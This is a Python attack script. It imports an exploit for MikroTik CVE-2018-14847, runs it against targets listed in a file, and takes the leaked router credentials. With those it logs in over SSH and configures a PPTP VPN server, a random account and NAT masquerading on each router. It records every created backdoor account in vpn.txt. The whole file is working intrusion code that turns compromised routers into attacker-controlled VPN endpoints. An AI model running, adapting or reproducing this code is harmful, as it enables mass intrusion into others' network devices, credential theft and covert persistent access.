import paramiko
import random
from MikroTik.cve_2018_14847.exploit import exploit
from MikroTik.cve_2018_14847.get_targets import format_file, format_single_ip


class SSHClient:

    def __init__(self):
        self.ssh = paramiko.SSHClient()

    def login(self, host, port, username, password):
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(host, port, username, password, timeout=10)

    def execute(self, command):

        try:
            # print('command', command)
            stdin, stdout, stderr = self.ssh.exec_command(command)
            # print('stdin', stdin)
            out = stdout.read()
            # print(out)
            result = out.decode('ascii')
            # print(result)
        except:
            out = b' '
            result = out.decode('ascii')

        return out, result

    def close(self):
        self.ssh.close()


class CreateVpn:

    def __init__(self, ip, port, usr, pwd):
        self.ssh = SSHClient()
        self.ip = ip
        self.port = port
        self.usr = usr
        self.pwd = pwd

    def random_profile(self):
        usr = ''.join(
            random.sample("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6))
        pwd = ''.join(random.sample("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 12))
        return usr, pwd

    def connect(self):
        try:
            self.ssh.login(self.ip, self.port, self.usr, self.pwd)
            result = 1
        except:
            result = 0

        return result

    # get ethernet information
    def get_ethernet(self):
        eth_info_list = []
        eth_out, eth_info = self.ssh.execute('/interface ethernet print')
        # print('ethernet out\n', eth_out)
        eth_list = eth_out.split(b'\r\n')
        for i in range(2, len(eth_list) - 2):
            per_eth = eth_list[i].decode('ascii').split(' ')
            while '' in per_eth:
                per_eth.remove('')
            # print('per_ethernet', per_eth)
            eth_info_list.append(per_eth)
        # print('ethernet info\n', eth_info)
        # print('ethernet list\n', eth_info_list)
        return eth_info_list

    # get bridge mac address
    def get_bridge(self):
        bri_mac_addr_list = []
        bri_name_list = []
        bri_out, bri_info = self.ssh.execute('/interface bridge print')
        bri_list = bri_out.split(b'\r\n\r\n')
        attention = b'Flags: X - disabled, R - running '
        if bri_list[0] == attention:
            print('warning')
            return [], []
        for i in range(0, len(bri_list) - 1):
            per_bri_list = bri_list[i].decode('ascii').split('mac-address=')
            per_mac_list = per_bri_list[1].split(' ')
            bri_mac_addr = per_mac_list[0]
            bri_mac_addr_list.append(bri_mac_addr)

            per_name_list = per_bri_list[0].split('name="')
            name_list = per_name_list[1].split('"')
            bri_name_list.append(name_list[0])

        return bri_mac_addr_list, bri_name_list

    # choose usable ethernet list
    def get_lan_ethernet(self):
        index_list = []
        lan_ethernet_list = []
        eth_info_list = self.get_ethernet()
        bri_mac_addr_list, bri_name_list = self.get_bridge()
        if bri_mac_addr_list == [] and bri_name_list == []:
            for i in range(0, len(eth_info_list)):
                if ('RS' in eth_info_list[i]) or ('R' in eth_info_list[i]):
                    lan_ethernet_list.append(eth_info_list[i])
        else:
            for i in range(0, len(eth_info_list)):
                for addr in bri_mac_addr_list:
                    if addr not in eth_info_list[i]:
                        index_list.append(i)
                    else:
                        break
            for index in set(index_list):
                if ('RS' in eth_info_list[index]) or ('R' in eth_info_list[index]):
                    lan_ethernet_list.append(eth_info_list[index])

        return lan_ethernet_list

    # create vpn
    def create_vpn(self):
        lan_int = self.get_lan_ethernet()[0][2]
        bri_mac_addr_list, bri_name_list = self.get_bridge()
        usr, pwd = self.random_profile()

        # self.ssh.execute('/ip address add address=192.168.100.121/24 interface=' + lan_int)

        self.ssh.execute('/ip pool add name="pptp-vpn-pool" ranges=192.168.100.10-192.168.100.30')
        self.ssh.execute(
            '/ppp profile add name="pptp-vpn-profile" use-encryption=yes local-address=192.168.100.121 dns-server=8.8.8.8,0.0.0.0 remote-address=pptp-vpn-pool')
        self.ssh.execute('/ppp secret add name=' + usr + ' profile=pptp-vpn-profile password=' + pwd + ' service=pptp')
        self.ssh.execute(
            '/interface pptp-server server set enabled=yes default-profile=pptp-vpn-profile authentication=mschap2,mschap1,chap,pap')
        if bri_mac_addr_list == [] and bri_name_list == []:
            self.ssh.execute(
                '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + lan_int + ' action=masquerade')
        else:
            self.ssh.execute(
                '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + bri_name_list[
                    0] + ' action=masquerade')

        return usr, pwd

    def disconnect(self):
        self.ssh.close()


def check_connection(ip, usr, pwd):
    vpn = CreateVpn(ip, 22, usr, pwd)
    result = vpn.connect()
    if result:
        vpn.disconnect()
        return 1
    else:
        return 0


def create_main(ip, usr, pwd):
    vpn = CreateVpn(ip, 22, usr, pwd)
    vpn.connect()
    vpn_username, vpn_password = vpn.create_vpn()
    vpn.disconnect()
    return vpn_username, vpn_password


def vpn(targets):
    info_list = exploit(targets)
    print(info_list)
    vpn_list = []
    for target in info_list:
        ip = target[0]
        print(ip)
        login_info = target[2]
        print(login_info)
        for u, p in login_info:
            print(u, p)
            check = check_connection(ip, u, p)
            if check:
                print('start create vpn')
                vpn_username, vpn_password = create_main(ip, u, p)
                vpn_info = [ip, vpn_username, vpn_password]
                print('write into vpn.txt')
                with open('vpn.txt', 'a')as f:
                    f.write(str(vpn_info))
                print('create vpn success')
                vpn_list.append(vpn_info)
            else:
                print('wrong password')
    return vpn_list


def run():
    targets = format_file('result.txt')
    print(vpn(targets))


if __name__ == '__main__':
    run()
